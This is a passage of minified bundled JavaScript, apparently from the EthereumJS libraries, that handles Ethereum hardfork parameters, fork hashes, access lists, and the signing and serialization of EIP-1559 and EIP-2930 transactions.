                    }, 0) > s) throw Error("Maximum HF determined by timestamp is lower than the block number/ttd HF");
                if (a.slice(c + 1).reduce((p, w) => {
                        var m;
                        return Math.min(Number((m = w.timestamp) !== null && m !== void 0 ? m : s), p)
                    }, s) < s) throw Error("Maximum HF determined by block number/ttd is lower than timestamp HF")
            }
            return a[c].name
        }
        setHardforkByBlockNumber(t, n, r) {
            const i = this.getHardforkByBlockNumber(t, n, r);
            return this.setHardfork(i), i
        }
        _getHardfork(t) {
            const n = this.hardforks();
            for (const r of n)
                if (r.name === t) return r;
            return null
        }
        setEIPs(t = []) {
            for (const n of t) {
                if (!(n in ko)) throw new Error(`${n} not supported`);
                const r = this.gteHardfork(ko[n].minimumHardfork);
                if (!r) throw new Error(`${n} cannot be activated on hardfork ${this.hardfork()}, minimumHardfork: ${r}`);
                if (ko[n].requiredEIPs !== void 0) {
                    for (const i of ko[n].requiredEIPs)
                        if (!(t.includes(i) || this.isActivatedEIP(i))) throw new Error(`${n} requires EIP ${i}, but is not included in the EIP list`)
                }
            }
            this._eips = t
        }
        param(t, n) {
            let r;
            for (const i of this._eips)
                if (r = this.paramByEIP(t, n, i), r !== void 0) return r;
            return this.paramByHardfork(t, n, this._hardfork)
        }
        paramByHardfork(t, n, r) {
            let i = null;
            for (const o of this.HARDFORK_CHANGES) {
                if ("eips" in o[1]) {
                    const s = o[1].eips;
                    for (const a of s) {
                        const l = this.paramByEIP(t, n, a);
                        i = typeof l == "bigint" ? l : i
                    }
                } else {
                    if (o[1][t] === void 0) throw new Error(`Topic ${t} not defined`);
                    o[1][t][n] !== void 0 && (i = o[1][t][n].v)
                }
                if (o[0] === r) break
            }
            return BigInt(i ?? 0)
        }
        paramByEIP(t, n, r) {
            if (!(r in ko)) throw new Error(`${r} not supported`);
            const i = ko[r];
            if (!(t in i)) throw new Error(`Topic ${t} not defined`);
            if (i[t][n] === void 0) return;
            const o = i[t][n].v;
            return BigInt(o)
        }
        paramByBlock(t, n, r, i, o) {
            const s = this.getHardforkByBlockNumber(r, i, o);
            return this.paramByHardfork(t, n, s)
        }
        isActivatedEIP(t) {
            if (this.eips().includes(t)) return !0;
            for (const n of this.HARDFORK_CHANGES) {
                const r = n[1];
                if (this.gteHardfork(r.name) && "eips" in r && r.eips.includes(t)) return !0
            }
            return !1
        }
        hardforkIsActiveOnBlock(t, n) {
            const r = _o(n, cn.BigInt),
                i = t ?? this._hardfork,
                o = this.hardforkBlock(i);
            return typeof o == "bigint" && o !== BigInt(0) && r >= o
        }
        activeOnBlock(t) {
            return this.hardforkIsActiveOnBlock(null, t)
        }
        hardforkGteHardfork(t, n) {
            const r = t ?? this._hardfork,
                i = this.hardforks();
            let o = -1,
                s = -1,
                a = 0;
            for (const l of i) l.name === r && (o = a), l.name === n && (s = a), a += 1;
            return o >= s && s !== -1
        }
        gteHardfork(t) {
            return this.hardforkGteHardfork(null, t)
        }
        hardforkBlock(t) {
            var n;
            const r = t ?? this._hardfork,
                i = (n = this._getHardfork(r)) === null || n === void 0 ? void 0 : n.block;
            return i == null ? null : BigInt(i)
        }
        hardforkTimestamp(t) {
            var n;
            const r = t ?? this._hardfork,
                i = (n = this._getHardfork(r)) === null || n === void 0 ? void 0 : n.timestamp;
            return i == null ? null : BigInt(i)
        }
        eipBlock(t) {
            for (const n of this.HARDFORK_CHANGES) {
                const r = n[1];
                if ("eips" in r && r.eips.includes(t)) return this.hardforkBlock(typeof n[0] == "number" ? String(n[0]) : n[0])
            }
            return null
        }
        hardforkTTD(t) {
            var n;
            const r = t ?? this._hardfork,
                i = (n = this._getHardfork(r)) === null || n === void 0 ? void 0 : n.ttd;
            return i == null ? null : BigInt(i)
        }
        isHardforkBlock(t, n) {
            const r = _o(t, cn.BigInt),
                i = n ?? this._hardfork,
                o = this.hardforkBlock(i);
            return typeof o == "bigint" && o !== BigInt(0) ? o === r : !1
        }
        nextHardforkBlockOrTimestamp(t) {
            var n, r;
            const i = t ?? this._hardfork,
                o = this.hardforks();
            let s = o.findIndex(c => c.name === i);
            if (i === Se.Merge && (s -= 1), s < 0) return null;
            let a = (n = o[s].timestamp) !== null && n !== void 0 ? n : o[s].block;
            a = a != null ? Number(a) : null;
            const l = o.slice(s + 1).find(c => {
                var d;
                let f = (d = c.timestamp) !== null && d !== void 0 ? d : c.block;
                return f = f != null ? Number(f) : null, c.name !== Se.Merge && f !== null && f !== void 0 && f !== a
            });
            if (l === void 0) return null;
            const u = (r = l.timestamp) !== null && r !== void 0 ? r : l.block;
            return u == null ? null : BigInt(u)
        }
        nextHardforkBlock(t) {
            const n = t ?? this._hardfork;
            let r = this.hardforkBlock(n);
            if (r === null && n === Se.Merge) {
                const o = this.hardforks(),
                    s = o.findIndex(a => a.ttd !== null && a.ttd !== void 0);
                if (s < 0) throw Error("Merge hardfork should have been found");
                r = this.hardforkBlock(o[s - 1].name)
            }
            return r === null ? null : this.hardforks().reduce((o, s) => {
                const a = BigInt(s.block === null || s.ttd !== void 0 && s.ttd !== null ? 0 : s.block);
                return a > r && o === null ? a : o
            }, null)
        }
        isNextHardforkBlock(t, n) {
            const r = _o(t, cn.BigInt),
                i = n ?? this._hardfork,
                o = this.nextHardforkBlock(i);
            return o === null ? !1 : o === r
        }
        _calcForkHash(t, n) {
            let r = new Uint8Array,
                i = 0;
            for (const a of this.hardforks()) {
                const {
                    block: l,
                    timestamp: u,
                    name: c
                } = a;
                let d = u ?? l;
                if (d = d !== null ? Number(d) : null, typeof d == "number" && d !== 0 && d !== i && c !== Se.Merge) {
                    const f = ke(d.toString(16).padStart(16, "0"));
                    r = Tt(r, f), i = d
                }
                if (a.name === t) break
            }
            const o = Tt(n, r);
            return ue(K6(Q8(o) >>> 0))
        }
        forkHash(t, n) {
            const r = t ?? this._hardfork,
                i = this._getHardfork(r);
            if (i === null || (i == null ? void 0 : i.block) === null && (i == null ? void 0 : i.timestamp) === void 0 && (i == null ? void 0 : i.ttd) === void 0) {
                const o = "No fork hash calculation possible for future hardfork";
                throw new Error(o)
            }
            if ((i == null ? void 0 : i.forkHash) !== null && (i == null ? void 0 : i.forkHash) !== void 0) return i.forkHash;
            if (!n) throw new Error("genesisHash required for forkHash calculation");
            return this._calcForkHash(r, n)
        }
        hardforkForForkHash(t) {
            const n = this.hardforks().filter(r => r.forkHash === t);
            return n.length >= 1 ? n[n.length - 1] : null
        }
        setForkHashes(t) {
            var n;
            for (const r of this.hardforks()) {
                const i = (n = r.timestamp) !== null && n !== void 0 ? n : r.block;
                (r.forkHash === null || r.forkHash === void 0) && (i != null || typeof r.ttd < "u") && (r.forkHash = this.forkHash(r.name, t))
            }
        }
        genesis() {
            return this._chainParams.genesis
        }
        hardforks() {
            return this._chainParams.hardforks
        }
        bootstrapNodes() {
            return this._chainParams.bootstrapNodes
        }
        dnsNetworks() {
            return this._chainParams.dnsNetworks
        }
        hardfork() {
            return this._hardfork
        }
        chainId() {
            return BigInt(this._chainParams.chainId)
        }
        chainName() {
            return this._chainParams.name
        }
        networkId() {
            return BigInt(this._chainParams.networkId)
        }
        eips() {
            return this._eips
        }
        consensusType() {
            const t = this.hardfork();
            let n;
            for (const r of this.HARDFORK_CHANGES)
                if ("consensus" in r[1] && (n = r[1].consensus.type), r[0] === t) break;
            return n ?? this._chainParams.consensus.type
        }
        consensusAlgorithm() {
            const t = this.hardfork();
            let n;
            for (const r of this.HARDFORK_CHANGES)
                if ("consensus" in r[1] && (n = r[1].consensus.algorithm), r[0] === t) break;
            return n ?? this._chainParams.consensus.algorithm
        }
        consensusConfig() {
            var t;
            const n = this.hardfork();
            let r;
            for (const i of this.HARDFORK_CHANGES)
                if ("consensus" in i[1] && (r = i[1].consensus[i[1].consensus.algorithm]), i[0] === n) break;
            return (t = r ?? this._chainParams.consensus[this.consensusAlgorithm()]) !== null && t !== void 0 ? t : {}
        }
        copy() {
            const t = Object.assign(Object.create(Object.getPrototypeOf(this)), this);
            return t.removeAllListeners(), t
        }
        static _getInitializedChains(t) {
            const n = {};
            for (const [i, o] of Object.entries(Ku)) n[o] = i.toLowerCase();
            const r = {
                mainnet: s8,
                goerli: o8,
                sepolia: a8
            };
            if (t)
                for (const i of t) {
                    const {
                        name: o
                    } = i;
                    n[i.chainId.toString()] = o, r[o] = i
                }
            return r.names = n, r
        }
    }
    var jn;
    (function(e) {
        e[e.EIP155ReplayProtection = 155] = "EIP155ReplayProtection", e[e.EIP1559FeeMarket = 1559] = "EIP1559FeeMarket", e[e.EIP2718TypedTransaction = 2718] = "EIP2718TypedTransaction", e[e.EIP2930AccessLists = 2930] = "EIP2930AccessLists"
    })(jn || (jn = {}));

    function K8(e) {
        if (e.length === 0) return !0;
        const t = e[0];
        return !!Array.isArray(t)
    }

    function Z8(e) {
        return !K8(e)
    }
    class ns {
        constructor(t) {
            if (t.length !== 20) throw new Error("Invalid address length");
            this.buf = t
        }
        static zero() {
            return new ns(lA(20))
        }
        equals(t) {
            return Qd(this.buf, t.buf)
        }
        isZero() {
            return this.equals(ns.zero())
        }
        toString() {
            return ue(this.buf)
        }
        toArray() {
            return this.buf
        }
        static publicToAddress(t, n = !1) {
            let r = t;
            if (Y0(r), n && r.length !== 64 && (r = Ir.ProjectivePoint.fromHex(r).toRawBytes(!1).slice(1)), r.length !== 64) throw new Error("Expected pubKey to be of length 64");
            return bt(r).slice(-20)
        }
    }
    const Y8 = (e, t) => {
            const n = e.param("vm", "maxInitCodeSize");
            if (n && BigInt(t) > n) throw new Error(`the initcode size of this transaction is too large: it is ${t} while the max is ${e.param("vm","maxInitCodeSize")}`)
        },
        gA = e => {
            let t, n;
            if (Z8(e)) {
                t = e;
                const r = [];
                for (let i = 0; i < e.length; i += 1) {
                    const o = e[i],
                        s = Re(o.address),
                        a = [];
                    for (let l = 0; l < o.storageKeys.length; l += 1) a.push(Re(o.storageKeys[l]));
                    r.push([s, a])
                }
                n = r
            } else {
                n = e ?? [];
                const r = [];
                for (let i = 0; i < n.length; i += 1) {
                    const o = n[i],
                        s = ue(o[0]),
                        a = [];
                    for (let u = 0; u < o[1].length; u += 1) a.push(ue(o[1][u]));
                    const l = {
                        address: s,
                        storageKeys: a
                    };
                    r.push(l)
                }
                t = r
            }
            return {
                AccessListJSON: t,
                accessList: n
            }
        },
        vA = e => {
            for (let t = 0; t < e.length; t += 1) {
                const n = e[t],
                    r = n[0],
                    i = n[1];
                if (n[2] !== void 0) throw new Error("Access list item cannot have 3 elements. It can only have an address, and an array of storage slots.");
                if (r.length !== 20) throw new Error("Invalid EIP-2930 transaction: address length should be 20 bytes");
                for (let o = 0; o < i.length; o += 1)
                    if (i[o].length !== 32) throw new Error("Invalid EIP-2930 transaction: storage slot length should be 32 bytes")
            }
        },
        yA = e => {
            const t = [];
            for (let n = 0; n < e.length; n += 1) {
                const r = e[n],
                    i = {
                        address: ue($y(r[0], 20)),
                        storageKeys: []
                    },
                    o = r && r[1];
                for (let s = 0; s < o.length; s += 1) {
                    const a = o[s];
                    i.storageKeys.push(ue($y(a, 32)))
                }
                t.push(i)
            }
            return t
        },
        wA = (e, t) => {
            const n = t.param("gasPrices", "accessListStorageKeyCost"),
                r = t.param("gasPrices", "accessListAddressCost");
            let i = 0;
            for (let s = 0; s < e.length; s += 1) {
                const l = e[s][1];
                i += l.length
            }
            return e.length * Number(r) + i * Number(n)
        };
    class ks {
        constructor(t, n) {
            var r, i;
            this.cache = {
                hash: void 0,
                dataFee: void 0
            }, this.activeCapabilities = [], this.DEFAULT_CHAIN = Ku.Mainnet, this.DEFAULT_HARDFORK = Se.Merge;
            const {
                nonce: o,
                gasLimit: s,
                to: a,
                value: l,
                data: u,
                v: c,
                r: d,
                s: f,
                type: h
            } = t;
            this._type = Number(Ae(Re(h))), this.txOptions = n;
            const v = Re(a === "" ? "0x" : a),
                p = Re(c === "" ? "0x" : c),
                w = Re(d === "" ? "0x" : d),
                m = Re(f === "" ? "0x" : f);
            this.nonce = Ae(Re(o === "" ? "0x" : o)), this.gasLimit = Ae(Re(s === "" ? "0x" : s)), this.to = v.length > 0 ? new ns(v) : void 0, this.value = Ae(Re(l === "" ? "0x" : l)), this.data = Re(u === "" ? "0x" : u), this.v = p.length > 0 ? Ae(p) : void 0, this.r = w.length > 0 ? Ae(w) : void 0, this.s = m.length > 0 ? Ae(m) : void 0, this._validateCannotExceedMaxInteger({
                value: this.value,
                r: this.r,
                s: this.s
            }), this._validateCannotExceedMaxInteger({
                gasLimit: this.gasLimit
            }, 64), this._validateCannotExceedMaxInteger({
                nonce: this.nonce
            }, 64, !0);
            const g = this.to === void 0 || this.to === null,
                y = (r = n.allowUnlimitedInitCodeSize) !== null && r !== void 0 ? r : !1,
                x = (i = n.common) !== null && i !== void 0 ? i : this._getCommon();
            g && x.isActivatedEIP(3860) && !y && Y8(x, this.data.length)
        }
        get type() {
            return this._type
        }
        supports(t) {
            return this.activeCapabilities.includes(t)
        }
        validate(t = !1) {
            const n = [];
            return this.getBaseFee() > this.gasLimit && n.push(`gasLimit is too low. given ${this.gasLimit}, need at least ${this.getBaseFee()}`), this.isSigned() && !this.verifySignature() && n.push("Invalid Signature"), t ? n : n.length === 0
        }
        _validateYParity() {
            const {
                v: t
            } = this;
            if (t !== void 0 && t !== BigInt(0) && t !== BigInt(1)) {
                const n = this._errorMsg("The y-parity of the transaction should either be 0 or 1");
                throw new Error(n)
            }
        }
        _validateHighS() {
            const {
                s: t
            } = this;
            if (this.common.gteHardfork("homestead") && t !== void 0 && t > G6) {
                const n = this._errorMsg("Invalid Signature: s-values greater than secp256k1n/2 are considered invalid");
                throw new Error(n)
            }
        }
        getBaseFee() {
            const t = this.common.param("gasPrices", "tx");
            let n = this.getDataFee();
            if (t && (n += t), this.common.gteHardfork("homestead") && this.toCreationAddress()) {
                const r = this.common.param("gasPrices", "txCreation");
                r && (n += r)
            }
            return n
        }
        getDataFee() {
            const t = this.common.param("gasPrices", "txDataZero"),
                n = this.common.param("gasPrices", "txDataNonZero");
            let r = BigInt(0);
            for (let i = 0; i < this.data.length; i += 1) this.data[i] === 0 ? r += t : r += n;
            if ((this.to === void 0 || this.to === null) && this.common.isActivatedEIP(3860)) {
                const i = BigInt(Math.ceil(this.data.length / 32)),
                    o = this.common.param("gasPrices", "initCodeWordCost") * i;
                r += o
            }
            return r
        }
        toCreationAddress() {
            return this.to === void 0 || this.to.buf.length === 0
        }
        isSigned() {
            const {
                v: t,
                r: n,
                s: r
            } = this;
            return !(t === void 0 || n === void 0 || r === void 0)
        }
        verifySignature() {
            try {
                const t = this.getSenderPublicKey();
                return Zu(t).length !== 0
            } catch {
                return !1
            }
        }
        getSenderAddress() {
            return new ns(ns.publicToAddress(this.getSenderPublicKey()))
        }
        sign(t) {
            if (t.length !== 32) {
                const l = this._errorMsg("Private key must be 32 bytes in length.");
                throw new Error(l)
            }
            let n = !1;
            this.type === 0 && this.common.gteHardfork("spuriousDragon") && !this.supports(jn.EIP155ReplayProtection) && (this.activeCapabilities.push(jn.EIP155ReplayProtection), n = !0);
            const r = this.getMessageToSign(!0),
                {
                    v: i,
                    r: o,
                    s
                } = this._ecsign(r, t),
                a = this._processSignature(i, o, s);
            if (n) {
                const l = this.activeCapabilities.indexOf(jn.EIP155ReplayProtection);
                l > -1 && this.activeCapabilities.splice(l, 1)
            }
            return a
        }
        _getCommon(t, n) {
            var r, i, o, s;
            if (n !== void 0) {
                const a = Ae(Re(n));
                if (t) {
                    if (t.chainId() !== a) {
                        const l = this._errorMsg("The chain ID does not match the chain ID of Common");
                        throw new Error(l)
                    }
                    return t.copy()
                }
                return qe.isSupportedChainId(a) ? new qe({
                    chain: a,
                    hardfork: this.DEFAULT_HARDFORK
                }) : qe.custom({
                    name: "custom-chain",
                    networkId: a,
                    chainId: a
                }, {
                    baseChain: this.DEFAULT_CHAIN,
                    hardfork: this.DEFAULT_HARDFORK
                })
            }
            if (t != null && t.copy && typeof(t == null ? void 0 : t.copy) == "function") return t.copy();
            if (t) {
                const a = typeof t.hardfork == "function" ? t.hardfork() : t.hardfork;
                return qe.custom({
                    name: "custom-chain",
                    networkId: t.networkId ? t.networkId() : (i = BigInt((r = t.customChain) === null || r === void 0 ? void 0 : r.networkId)) !== null && i !== void 0 ? i : void 0,
                    chainId: t.chainId ? t.chainId() : (s = BigInt((o = t.customChain) === null || o === void 0 ? void 0 : o.chainId)) !== null && s !== void 0 ? s : void 0
                }, {
                    baseChain: this.DEFAULT_CHAIN,
                    hardfork: a || this.DEFAULT_HARDFORK
                })
            }
            return new qe({
                chain: this.DEFAULT_CHAIN,
                hardfork: this.DEFAULT_HARDFORK
            })
        }
        _validateCannotExceedMaxInteger(t, n = 256, r = !1) {
            for (const [i, o] of Object.entries(t)) switch (n) {
                case 64:
                    if (r) {
                        if (o !== void 0 && o >= Dy) {
                            const s = this._errorMsg(`${i} cannot equal or exceed MAX_UINT64 (2^64-1), given ${o}`);
                            throw new Error(s)
                        }
                    } else if (o !== void 0 && o > Dy) {
                        const s = this._errorMsg(`${i} cannot exceed MAX_UINT64 (2^64-1), given ${o}`);
                        throw new Error(s)
                    }
                    break;
                case 256:
                    if (r) {
                        if (o !== void 0 && o >= xl) {
                            const s = this._errorMsg(`${i} cannot equal or exceed MAX_INTEGER (2^256-1), given ${o}`);
                            throw new Error(s)
                        }
                    } else if (o !== void 0 && o > xl) {
                        const s = this._errorMsg(`${i} cannot exceed MAX_INTEGER (2^256-1), given ${o}`);
                        throw new Error(s)
                    }
                    break;
                default:
                    {
                        const s = this._errorMsg("unimplemented bits value");
                        throw new Error(s)
                    }
            }
        }
        static _validateNotArray(t) {
            const n = ["nonce", "gasPrice", "gasLimit", "to", "value", "data", "v", "r", "s", "type", "baseFee", "maxFeePerGas", "chainId"];
            for (const [r, i] of Object.entries(t))
                if (n.includes(r) && Array.isArray(i)) throw new Error(`${r} cannot be an array`)
        }
        _getSharedErrorPostfix() {
            let t = "";
            try {
                t = this.isSigned() ? ue(this.hash()) : "not available (unsigned)"
            } catch {
                t = "error"
            }
            let n = "";
            try {
                n = this.isSigned().toString()
            } catch {
                t = "error"
            }
            let r = "";
            try {
                r = this.common.hardfork()
            } catch {
                r = "error"
            }
            let i = `tx type=${this.type} hash=${t} nonce=${this.nonce} value=${this.value} `;
            return i += `signed=${n} hf=${r}`, i
        }
        _ecsign(t, n, r) {
            const i = Ir.sign(t, n),
                o = i.toCompactRawBytes(),
                s = o.subarray(0, 32),
                a = o.subarray(32, 64),
                l = r === void 0 ? BigInt(i.recovery + 27) : BigInt(i.recovery + 35) + BigInt(r) * BigInt(2);
            return {
                r: s,
                s: a,
                v: l
            }
        }
        static fromSerializedTx(t, n = {}) {}
        static fromTxData(t, n = {}) {}
    }
    const Hp = 2,
        sh = ke(Hp.toString(16).padStart(2, "0"));
    class Di extends ks {
        constructor(t, n = {}) {
            var r;
            super(Object.assign(Object.assign({}, t), {
                type: Hp
            }), n), this.DEFAULT_HARDFORK = "london";
            const {
                chainId: i,
                accessList: o,
                maxFeePerGas: s,
                maxPriorityFeePerGas: a
            } = t;
            if (this.common = this._getCommon(n.common, i), this.chainId = this.common.chainId(), !this.common.isActivatedEIP(1559)) throw new Error("EIP-1559 not enabled on Common");
            this.activeCapabilities = this.activeCapabilities.concat([1559, 2718, 2930]);
            const l = gA(o ?? []);
            if (this.accessList = l.accessList, this.AccessListJSON = l.AccessListJSON, vA(this.accessList), this.maxFeePerGas = Ae(Re(s === "" ? "0x" : s)), this.maxPriorityFeePerGas = Ae(Re(a === "" ? "0x" : a)), this._validateCannotExceedMaxInteger({
                    maxFeePerGas: this.maxFeePerGas,
                    maxPriorityFeePerGas: this.maxPriorityFeePerGas
                }), ks._validateNotArray(t), this.gasLimit * this.maxFeePerGas > xl) {
                const c = this._errorMsg("gasLimit * maxFeePerGas cannot exceed MAX_INTEGER (2^256-1)");
                throw new Error(c)
            }
            if (this.maxFeePerGas < this.maxPriorityFeePerGas) {
                const c = this._errorMsg("maxFeePerGas cannot be less than maxPriorityFeePerGas (The total must be the larger of the two)");
                throw new Error(c)
            }
            this._validateYParity(), this._validateHighS(), ((r = n == null ? void 0 : n.freeze) !== null && r !== void 0 ? r : !0) && Object.freeze(this)
        }
        static fromTxData(t, n = {}) {
            return new Di(t, n)
        }
        static fromSerializedTx(t, n = {}) {
            if (!Qd(t.subarray(0, 1), sh)) throw new Error(`Invalid serialized tx input: not an EIP-1559 transaction (wrong tx type, expected: ${Hp}, received: ${ue(t.subarray(0,1))}`);
            const r = zt.decode(t.subarray(1));
            if (!Array.isArray(r)) throw new Error("Invalid serialized tx input: must be array");
            return Di.fromValuesArray(r, n)
        }
        static fromValuesArray(t, n = {}) {
            if (t.length !== 9 && t.length !== 12) throw new Error("Invalid EIP-1559 transaction. Only expecting 9 values (for unsigned tx) or 12 values (for signed tx).");
            const [r, i, o, s, a, l, u, c, d, f, h, v] = t;
            return this._validateNotArray({
                chainId: r,
                v: f
            }), P0({
                nonce: i,
                maxPriorityFeePerGas: o,
                maxFeePerGas: s,
                gasLimit: a,
                value: u,
                v: f,
                r: h,
                s: v
            }), new Di({
                chainId: Ae(r),
                nonce: i,
                maxPriorityFeePerGas: o,
                maxFeePerGas: s,
                gasLimit: a,
                to: l,
                value: u,
                data: c,
                accessList: d ?? [],
                v: f !== void 0 ? Ae(f) : void 0,
                r: h,
                s: v
            }, n)
        }
        getDataFee() {
            if (this.cache.dataFee && this.cache.dataFee.hardfork === this.common.hardfork()) return this.cache.dataFee.value;
            let t = super.getDataFee();
            return t += BigInt(wA(this.accessList, this.common)), Object.isFrozen(this) && (this.cache.dataFee = {
                value: t,
                hardfork: this.common.hardfork()
            }), t
        }
        getUpfrontCost(t = BigInt(0)) {
            const n = this.maxPriorityFeePerGas,
                r = this.maxFeePerGas - t,
                o = (n < r ? n : r) + t;
            return this.gasLimit * o + this.value
        }
        raw() {
            return [he(this.chainId), he(this.nonce), he(this.maxPriorityFeePerGas), he(this.maxFeePerGas), he(this.gasLimit), this.to !== void 0 ? this.to.buf : Uint8Array.from([]), he(this.value), this.data, this.accessList, this.v !== void 0 ? he(this.v) : Uint8Array.from([]), this.r !== void 0 ? he(this.r) : Uint8Array.from([]), this.s !== void 0 ? he(this.s) : Uint8Array.from([])]
        }
        serialize() {
            const t = this.raw();
            return Tt(sh, zt.encode(t))
        }
        getMessageToSign(t = !0) {
            const n = this.raw().slice(0, 9),
                r = Tt(sh, zt.encode(n));
            return t ? bt(r) : r
        }
        hash() {
            if (!this.isSigned()) {
                const t = this._errorMsg("Cannot call hash method if transaction is not signed");
                throw new Error(t)
            }
            return Object.isFrozen(this) ? (this.cache.hash || (this.cache.hash = bt(this.serialize())), this.cache.hash) : bt(this.serialize())
        }
        getMessageToVerifySignature() {
            return this.getMessageToSign()
        }
        getSenderPublicKey() {
            if (!this.isSigned()) {
                const o = this._errorMsg("Cannot call this method if transaction is not signed");
                throw new Error(o)
            }
            const t = this.getMessageToVerifySignature(),
                {
                    v: n,
                    r,
                    s: i
                } = this;
            this._validateHighS();
            try {
                return J0(t, n + BigInt(27), he(r), he(i))
            } catch {
                const s = this._errorMsg("Invalid Signature");
                throw new Error(s)
            }
        }
        _processSignature(t, n, r) {
            const i = Object.assign(Object.assign({}, this.txOptions), {
                common: this.common
            });
            return Di.fromTxData({
                chainId: this.chainId,
                nonce: this.nonce,
                maxPriorityFeePerGas: this.maxPriorityFeePerGas,
                maxFeePerGas: this.maxFeePerGas,
                gasLimit: this.gasLimit,
                to: this.to,
                value: this.value,
                data: this.data,
                accessList: this.accessList,
                v: t - BigInt(27),
                r: Ae(n),
                s: Ae(r)
            }, i)
        }
        toJSON() {
            const t = yA(this.accessList);
            return {
                chainId: Ne(this.chainId),
                nonce: Ne(this.nonce),
                maxPriorityFeePerGas: Ne(this.maxPriorityFeePerGas),
                maxFeePerGas: Ne(this.maxFeePerGas),
                gasLimit: Ne(this.gasLimit),
                to: this.to !== void 0 ? this.to.toString() : void 0,
                value: Ne(this.value),
                data: ue(this.data),
                accessList: t,
                v: this.v !== void 0 ? Ne(this.v) : void 0,
                r: this.r !== void 0 ? Ne(this.r) : void 0,
                s: this.s !== void 0 ? Ne(this.s) : void 0
            }
        }
        errorStr() {
            let t = this._getSharedErrorPostfix();
            return t += ` maxFeePerGas=${this.maxFeePerGas} maxPriorityFeePerGas=${this.maxPriorityFeePerGas}`, t
        }
        _errorMsg(t) {
            return `${t} (${this.errorStr()})`
        }
    }
    const $p = 1,
        ah = ke($p.toString(16).padStart(2, "0"));
    class ji extends ks {
        constructor(t, n = {}) {
            var r;
            super(Object.assign(Object.assign({}, t), {
                type: $p
            }), n), this.DEFAULT_HARDFORK = "berlin";
            const {
                chainId: i,
                accessList: o,
                gasPrice: s
            } = t;
            if (this.common = this._getCommon(n.common, i), this.chainId = this.common.chainId(), !this.common.isActivatedEIP(2930)) throw new Error("EIP-2930 not enabled on Common");
            this.activeCapabilities = this.activeCapabilities.concat([2718, 2930]);
            const a = gA(o ?? []);
            if (this.accessList = a.accessList, this.AccessListJSON = a.AccessListJSON, vA(this.accessList), this.gasPrice = Ae(Re(s === "" ? "0x" : s)), this._validateCannotExceedMaxInteger({
                    gasPrice: this.gasPrice
                }), ks._validateNotArray(t), this.gasPrice * this.gasLimit > xl) {
                const u = this._errorMsg("gasLimit * gasPrice cannot exceed MAX_INTEGER");
                throw new Error(u)
            }
            this._validateYParity(), this._validateHighS(), ((r = n == null ? void 0 : n.freeze) !== null && r !== void 0 ? r : !0) && Object.freeze(this)
        }
        static fromTxData(t, n = {}) {
            return new ji(t, n)
        }
        static fromSerializedTx(t, n = {}) {
            if (!Qd(t.subarray(0, 1), ah)) throw new Error(`Invalid serialized tx input: not an EIP-2930 transaction (wrong tx type, expected: ${$p}, received: ${ue(t.subarray(0,1))}`);
            const r = zt.decode(Uint8Array.from(t.subarray(1)));
            if (!Array.isArray(r)) throw new Error("Invalid serialized tx input: must be array");
            return ji.fromValuesArray(r, n)
        }
        static fromValuesArray(t, n = {}) {
            if (t.length !== 8 && t.length !== 11) throw new Error("Invalid EIP-2930 transaction. Only expecting 8 values (for unsigned tx) or 11 values (for signed tx).");
            const [r, i, o, s, a, l, u, c, d, f, h] = t;
            this._validateNotArray({
                chainId: r,
                v: d
            }), P0({
                nonce: i,
                gasPrice: o,
                gasLimit: s,
                value: l,
                v: d,
                r: f,
                s: h
            });
            const v = [];
            return new ji({
                chainId: Ae(r),
                nonce: i,
                gasPrice: o,
                gasLimit: s,
                to: a,
                value: l,
                data: u,
                accessList: c ?? v,
                v: d !== void 0 ? Ae(d) : void 0,
                r: f,
                s: h
            }, n)
        }
        getDataFee() {
            if (this.cache.dataFee && this.cache.dataFee.hardfork === this.common.hardfork()) return this.cache.dataFee.value;
            let t = super.getDataFee();
            return t += BigInt(wA(this.accessList, this.common)), Object.isFrozen(this) && (this.cache.dataFee = {
                value: t,
                hardfork: this.common.hardfork()
            }), t
        }
        getUpfrontCost() {
            return this.gasLimit * this.gasPrice + this.value
        }
        raw() {
            return [he(this.chainId), he(this.nonce), he(this.gasPrice), he(this.gasLimit), this.to !== void 0 ? this.to.buf : Uint8Array.from([]), he(this.value), this.data, this.accessList, this.v !== void 0 ? he(this.v) : Uint8Array.from([]), this.r !== void 0 ? he(this.r) : Uint8Array.from([]), this.s !== void 0 ? he(this.s) : Uint8Array.from([])]
        }
        serialize() {
            const t = this.raw();
            return Tt(ah, zt.encode(t))
        }
        getMessageToSign(t = !0) {
            const n = this.raw().slice(0, 8),
                r = Tt(ah, zt.encode(n));
            return t ? bt(r) : r
        }
        hash() {
            if (!this.isSigned()) {
                const t = this._errorMsg("Cannot call hash method if transaction is not signed");
                throw new Error(t)
            }
            return Object.isFrozen(this) ? (this.cache.hash || (this.cache.hash = bt(this.serialize())), this.cache.hash) : bt(this.serialize())
        }
        getMessageToVerifySignature() {
            return this.getMessageToSign()
        }
        getSenderPublicKey() {
            if (!this.isSigned()) {
                const o = this._errorMsg("Cannot call this method if transaction is not signed");
                throw new Error(o)
            }
            const t = this.getMessageToVerifySignature(),
                {
                    v: n,
                    r,
                    s: i
                } = this;
            this._validateHighS();
            try {
                return J0(t, n + BigInt(27), he(r), he(i))
            } catch {
                const s = this._errorMsg("Invalid Signature");
                throw new Error(s)
            }
        }
        _processSignature(t, n, r) {
            const i = Object.assign(Object.assign({}, this.txOptions), {
                common: this.common
            });
            return ji.fromTxData({
                chainId: this.chainId,
                nonce: this.nonce,
                gasPrice: this.gasPrice,
                gasLimit: this.gasLimit,
                to: this.to,
                value: this.value,
                data: this.data,
                accessList: this.accessList,
                v: t - BigInt(27),
                r: Ae(n),
                s: Ae(r)
            }, i)
        }
        toJSON() {
            const t = yA(this.accessList);
            return {
                chainId: Ne(this.chainId),
                nonce: Ne(this.nonce),
                gasPrice: Ne(this.gasPrice),
                gasLimit: Ne(this.gasLimit),
                to: this.to !== void 0 ? this.to.toString() : void 0,
                value: Ne(this.value),
                data: ue(this.data),
                accessList: t,
                v: this.v !== void 0 ? Ne(this.v) : void 0,
                r: this.r !== void 0 ? Ne(this.r) : void 0,
                s: this.s !== void 0 ? Ne(this.s) : void 0
            }
        }
        errorStr() {
            var t, n;
            let r = this._getSharedErrorPostfix();
            return r += ` gasPrice=${this.gasPrice} accessListCount=${(n=(t=this.accessList)===null||t===void 0?void 0:t.length)!==null&&n!==void 0?n:0}`, r
        }
        _errorMsg(t) {
            return `${t} (${this.errorStr()})`
        }
    }
    const J8 = 0;

    function Gy(e, t) {
        const n = Number(e),
            r = Number(t) * 2;
        return n === r + 35 || n === r + 36
    }
    class Vr extends ks {
        constructor(t, n = {}) {
            var r;
            if (super(Object.assign(Object.assign({}, t), {
                    type: J8
